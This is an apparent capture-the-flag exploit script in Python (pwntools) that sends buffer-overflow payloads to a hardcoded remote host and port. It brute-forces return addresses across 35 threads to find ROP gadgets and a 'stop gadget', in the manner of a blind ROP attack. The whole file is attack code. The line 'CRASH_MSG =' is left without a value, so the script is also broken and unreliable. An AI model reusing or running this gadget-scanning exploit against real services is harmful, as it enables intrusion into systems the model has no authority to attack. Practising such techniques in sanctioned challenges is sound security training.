#!/usr/bin/env python
from pwn import *
from LibcSearcher import *

host = '54.161.125.246'
port = 1000
header = 'Welcome to TKCTF! Do you know the password? (Please overflow me. Please.)\n'

_lock = threading.Lock()
def get_next(it):
    with _lock:
        offset = next(it)
        return offset
CRASH_MSG =
payload = 'a'*70
def scan_for_gadgets(payload, it, base=0x400000):
    p = remote("54.161.125.246", 1000)
    offset = 0
    while True:
        try:
            offset = get_next(it)
        except:
            p.close()
            return
        if offset % 0x100 == 0:
            print "[!] currently at 0x%x" % offset
        # we have  no interest in instructions that reference base pointer
        rbp = p64(0)
        rip = p64(base+offset)
        # Also I want no assumptions about values stored before rip
        p.send(payload+rbp+rip+"A"*128)
        time.sleep(2)
        output = p.recv()
        if CRASH_MSG not in output:
            print "[*] Safe gadget at " + hex(base + offset)
        if output.strip(payload) not in["", CRASH_MSG]:
            print "[*] Memory leak at " + hex(base + offset)
        p.send("A\x00")
        time.sleep(2)
        output = p.recv(timeout=1)
        if output == "":
            print "[+] Stop Gadget at " + hex(base + offset)
            break

def get_stop_gadget(offset=70):
    addr = 0x400560
    p = log.progress('Address')
    while True:
        try:
            context.log_level = 'info'  # suspend all logging
            p.status(hex(addr))
            context.log_level = 'critical'  # suspend all logging
            r = remote(host, port)
            r.recvuntil(header)
            r.sendline('a' * offset + p64(addr))
            content = r.recv()
            print content
            r.close()
            if 'password' in content:
                print 'stop gadget: ' + hex(addr)
                #return addr
            addr += 1
        except EOFError:
            r.close()
            addr += 1
        except PwnlibException:
            print 'PwnlibException: ' + hex(addr)
            pass

iterator = iter(range(0x1000))
for i in range(35):
    threading.Thread(target=scan_for_gadgets, args=(payload, iterator)).start()
    time.sleep(1)
exit()

